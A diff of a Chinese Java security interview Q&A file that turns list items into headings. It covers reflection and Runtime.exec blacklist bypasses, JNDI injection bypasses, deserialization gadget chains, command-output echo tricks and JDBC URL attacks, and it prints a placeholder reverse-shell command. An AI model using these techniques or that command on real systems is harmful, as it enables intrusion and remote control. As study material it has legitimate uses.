@@ -1,12 +1,12 @@
 ## JDK
 
-- Java反射做了什么事情（★）
+### Java反射做了什么事情（★）
 
 反射是根据字节码获得类信息或调用方法。从开发者角度来讲，反射最大的意义是提高程序的灵活性。Java本身是静态语言，但反射特性允许运行时动态修改类定义和属性等，达到了动态的效果
 
 
 
-- Java反射可以修改Final字段嘛（★★）
+### Java反射可以修改Final字段嘛（★★）
 
 可以做到，参考以下代码
 
@@ -20,7 +20,7 @@ field.set(null, newValue);
 
 
 
-- 传统的反射方法加入黑名单怎么绕（★★★）
+### 传统的反射方法加入黑名单怎么绕（★★★）
 
 可以使用的类和方法如下（参考三梦师傅）
 
@@ -38,7 +38,7 @@ JSClassLoader.newInstance
 
 
 
-- Java中可以执行反弹shell的命令吗（★★）
+### Java中可以执行反弹shell的命令吗（★★）
 
 可以执行，但需要对命令进行特殊处理。例如直接执行这样的命令：`bash -i >& /dev/tcp/ip/port 0>&1`会失败，简单来说因为`>`符号是重定向，如果命令中包含输入输出重定向和管道符，只有在`bash`下才可以，使用Java执行这样的命令会失败，所以需要加入`Base64`
 
@@ -77,7 +77,7 @@ public static String getPowershellCommand(String cmd) {
 
 
 
-- 假设`Runtime.exec`加入黑名单还有什么方式执行命令（★★）
+### 假设`Runtime.exec`加入黑名单还有什么方式执行命令（★★）
 
 其实这个问题有点类似`JSP Webshell`免杀
 
@@ -85,7 +85,7 @@ public static String getPowershellCommand(String cmd) {
 
 
 
-- RMI和LDAP类型的JNDI注入分别在哪个版本限制（★）
+### RMI和LDAP类型的JNDI注入分别在哪个版本限制（★）
 
 RMI的JNDI注入在8u121后限制，需要手动开启`com.sun.jndi.rmi.object.trustURLCodebase`属性
 
@@ -93,7 +93,7 @@ LDAP的JNDI注入在8u191后限制，需要开启`com.sun.jndi.ldap.object.trust
 
 
 
-- RMI和LDAP的限制版本分别可以怎样绕过（★★）
+### RMI和LDAP的限制版本分别可以怎样绕过（★★）
 
 RMI的限制是限制了远程的工厂类而不限制本地，所以用本地工厂类触发
 
@@ -103,7 +103,7 @@ LDAP的限制中不对`javaSerializedData`验证，所以可以打本地`gadget`
 
 
 
-- 谈谈TemplatesImpl这个类（★★）
+### 谈谈TemplatesImpl这个类（★★）
 
 这个类本身是JDK中XML相关的类，但被很多`Gadget`拿来用
 
@@ -122,7 +122,7 @@ TemplatesImpl.getOutputProperties()
 
 
 
-- 了解BCEL ClassLoader吗（★）
+### 了解BCEL ClassLoader吗（★）
 
 BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目
 
@@ -132,7 +132,7 @@ BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一�
 
 
 
-- 谈谈7U21反序列化（★★★★★）
+### 谈谈7U21反序列化（★★★★★）
 
 从`LinkedHashSet.readObject`开始，找到父类`HashSet.readObject`方法，其中包含`HashMap`的类型转换以及`HashMap.put`方法，跟入`HashMap.put`其中对`key`与已有`key`进行`equals`判断，这个`equals`方法是触发后续利用链的关键。但`equals`方法的前置条件必须满足
 
@@ -180,7 +180,7 @@ LinkedHashSet.readObject()
 
 
 
-- 谈谈8U20反序列化（★★★★★）
+### 谈谈8U20反序列化（★★★★★）
 
 这是7U21修复的绕过
 
@@ -190,13 +190,13 @@ LinkedHashSet.readObject()
 
 
 
-- 了解缩小反序列化Payload的手段吗（★★★）
+### 了解缩小反序列化Payload的手段吗（★★★）
 
 首先最容易的方案是使用Javassist生成字节码，这种情况下生成的字节码较小。进一步可以用ASM删除所有的LineNumber指令，可以更小一步。最终手段可以分块发送多个Payload最后合并再用URLClassLoader加载
 
 
 
-- 谈谈实战中命令执行有哪些回显的办法（★★★★）
+### 谈谈实战中命令执行有哪些回显的办法（★★★★）
 
 首先想到的办法是`dnslog`等技术进行外带，但必须出网，有限制
 
@@ -210,7 +210,7 @@ Y4er师傅提到的自定义类加载器配合RMI的一种方式
 
 
 
-- 有没有了解过针对`linux`的通杀的回显方式（★★★★）
+### 有没有了解过针对`linux`的通杀的回显方式（★★★★）
 
 获取本次`http`请求用到`socket`的文件描述符，然后往文件描述符里写命令执行的结果
 
@@ -218,7 +218,7 @@ Y4er师傅提到的自定义类加载器配合RMI的一种方式
 
 
 
-- 是否存在针对`windows`的通杀的回显方式（★★★★）
+### 是否存在针对`windows`的通杀的回显方式（★★★★）
 
 原理类似`linux`的通杀回显，在`windows`中`nio/bio`中有类似于`linux`文件描述符这样的句柄文件
 
@@ -226,7 +226,7 @@ Y4er师傅提到的自定义类加载器配合RMI的一种方式
 
 
 
-- 是否了解JDBC Connection URL攻击（★★★）
+### 是否了解JDBC Connection URL攻击（★★★）
 
 果我们可以控制`JDBC URI`就可将`JDBC`连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据
 
